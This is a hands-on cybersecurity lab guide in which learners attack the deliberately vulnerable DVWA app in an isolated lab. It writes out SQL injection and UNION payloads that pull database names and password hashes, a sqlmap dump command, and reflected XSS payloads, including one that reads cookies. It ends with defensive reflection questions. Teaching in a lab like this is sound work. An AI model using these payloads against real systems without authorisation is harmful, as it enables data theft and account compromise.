## Scenario 2 — SQL Injection

> **Network:** Kali `$TARGET_KALI`, DVWA `$TARGET_DVWA` (HTTP). Meta is not required for this lab.

**Difficulty:** Intermediate  
**Estimated time:** 45–60 minutes  
**Role:** Attacker  
**Target:** DVWA on `$TARGET_DVWA`

### Learning outcomes

- Find a SQL injection point in DVWA (security **Low**)  
- Extract database/table/user data with manual UNION payloads  
- Automate extraction with SQLMap from **Kali**  
- Exploit Reflected Cross-Site Scripting (XSS) in DVWA (security **Low**)  
- Use portal **Manual Check** after each milestone (fulfilling TC-S12-07 Step 2)  

### Lab topology & credentials

| Item | Value |
|---|---|
| DVWA URL (from Kali) | `http://$TARGET_DVWA/dvwa/` |
| DVWA login | `admin` / `password` |
| Security level | **Low** (DVWA Security menu) |
| Your shell | Portal tab **Kali Linux (CLI)** |

**Browser access (preferred, TryHackMe-style):**  
When the portal shows **Open DVWA**, use that button — it opens the web app in **your** browser (session-gated). You do **not** need a Kali desktop or VNC.

If **Open DVWA** is not available yet on your deployment, use Kali CLI (`curl`) or any browser path your instructor provides to `http://$TARGET_DVWA/...` from a machine that can reach the lab (usually only via portal proxy).

---

### Task 1 — Injection Point (Milestone 1)

**Goal:** Prove the SQL Injection module returns all users with a classic payload.

1. Open DVWA (portal **Open DVWA** or equivalent).  
2. Log in: `admin` / `password`. You should land on the DVWA menu, **not** “Create / Reset Database”. If you see setup.php, tell the instructor.  
3. Set **DVWA Security → Low → Submit**. Other DVWA modules are hidden and blocked in the portal.  
4. Open **SQL Injection**.  
5. In **User ID**, submit:

```text
1' OR '1'='1
```

**Done when:** Multiple user rows appear in **Open DVWA**.  
Each browser response scores only the milestone it proves. Submit this OR payload (or `1'` when the page shows a SQL syntax error), then click **Manual Check** on Injection Point. You do not need Kali for this milestone.

Optional Kali fallback (if browser scoring is unavailable):

```bash
curl -s -b "PHPSESSID=<session_id>; security=low" \
  "http://$TARGET_DVWA/dvwa/vulnerabilities/sqli/?id=1'+OR+'1'='1&Submit=Submit" > /tmp/sqli_probe.txt
```

**Manual Check** on Injection Point.

<details>
<summary>Hint</summary>

A users-table dump later does **not** complete this milestone. An `echo` of the payload string is not evidence.

</details>

---

### Task 2 — Database Extraction (Milestone 2)

**Goal:** Pull useful data with UNION-based injection (still security Low).

In the DVWA **User ID** field (browser), submit this payload for **this** milestone (a separate submit from Tasks 1 and 3):

```text
1' UNION SELECT null, database() -- -
```

**Done when:** The Surname (or First name) cell shows the database name `dvwa`. Then **Manual Check** on Database Extraction. You do not need Kali for this milestone.

You may also explore:

```text
1' UNION SELECT null, table_name FROM information_schema.tables WHERE table_schema=database() -- -
```

Optional Kali fallback: save a real `username:32-hex-hash` line you saw into `/tmp/sqli_users.txt` (not the UNION sentence itself).

<details>
<summary>Hint</summary>

DVWA Low often needs a space before `-- -` and the correct column count (two columns in this module).

</details>

---

### Task 3 — Admin Hash (Milestone 3)

**Goal:** Extract the admin password hash. Prefer the browser; sqlmap on Kali remains an optional fallback.

**Browser (preferred):** In DVWA **User ID**, submit (separate from Tasks 1 and 2):

```text
1' UNION SELECT user, password FROM users -- -
```

**Done when:** A Surname cell shows a 32-character hex hash. Then **Manual Check** on Admin Hash. A users dump does **not** fill in milestones 1 and 2 automatically.

**Optional Kali fallback (sqlmap):**

```bash
sqlmap -u "http://$TARGET_DVWA/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=<session_id>; security=low" \
  -D dvwa -T users --dump --batch

printf '5f4dcc3b5aa765d61d8327deb882cf99\n' > /tmp/admin_hash.txt
```

Keep `$TARGET_DVWA`. Replace only `<session_id>`. The hash file must be 32 hex characters. A non-empty file alone is not enough.

<details>
<summary>Hint</summary>

Do not leave `<session_id>` or `<admin_hash_here>` in commands or files.

</details>

---

### Task 4 — Reflected XSS (Milestone 4)

**Goal:** Exploit DVWA's Reflected Cross-Site Scripting module and verify payload execution in your browser (fulfilling **TC-S12-07 Step 2: "Perform SQL injection and reflect XSS at the set difficulty"**).

1. In DVWA (security set to **Low**), open **XSS (Reflected)** from the left navigation menu (`/vulnerabilities/xss_r/`).
2. In the **What's your name?** input field, enter a JavaScript test payload:

```html
<script>alert('XSS')</script>
```

*(Alternatively: `<script>alert(document.cookie)</script>` or `<script>alert(1)</script>`)*

3. Click **Submit**.
4. **Done when:** The browser executes the JavaScript (alert) and the page shows unescaped `Hello <script…`. Then **Manual Check** on Reflected XSS. Open DVWA is enough; Kali is optional.

Optional Kali fallback:

```bash
curl -s -b "PHPSESSID=<session_id>; security=low" \
  "http://$TARGET_DVWA/dvwa/vulnerabilities/xss_r/?name=%3Cscript%3Ealert(1)%3C%2Fscript%3E&Submit=Submit" > /tmp/xss_reflected.txt
grep -i "Hello <script" /tmp/xss_reflected.txt
```

<details>
<summary>Hint</summary>

Reflected XSS occurs when an application receives data in an HTTP request and includes that data within the immediate response in an unsafe way. Setting DVWA security to **Low** disables htmlspecialchars/sanitization on the `name` parameter.

</details>

---

### Common failures

| Symptom | Fix |
|---|---|
| Blank DVWA / connection refused | Use portal **Open DVWA** or confirm `$TARGET_DVWA` from Kali: `curl -sI http://$TARGET_DVWA/dvwa/` |
| Only one row returned | Security not Low, or payload syntax |
| Manual Check FAIL on M1–M3 | Submit the three payloads separately in Open DVWA (OR / `database()` / `FROM users`); one users dump does not complete 1 and 2 |
| Manual Check FAIL on M3 (Kali path) | sqlmap on Kali plus a 32-hex `/tmp/admin_hash.txt` |
| Manual Check FAIL on M4 | Payload not reflected as `Hello <script` in Open DVWA (or Kali curl/`/tmp/xss_reflected.txt` fallback) |
| XSS alert does not pop up | DVWA security is not set to Low; check DVWA Security menu |
| Session expired in sqlmap | Log into DVWA again; refresh PHPSESSID |

### Optional blue-team note (not scored)

Wazuh may log web attack patterns against the DVWA agent. Full alert triage is **Scenario 3**.

### Reflection (optional)

- How does parameterized SQL prevent this class of bug?  
- Why is automating extraction with SQLMap riskier (and noisier) than a single manual payload?  
- How does context-sensitive output encoding prevent Reflected XSS, and why is client-side sanitization alone insufficient?
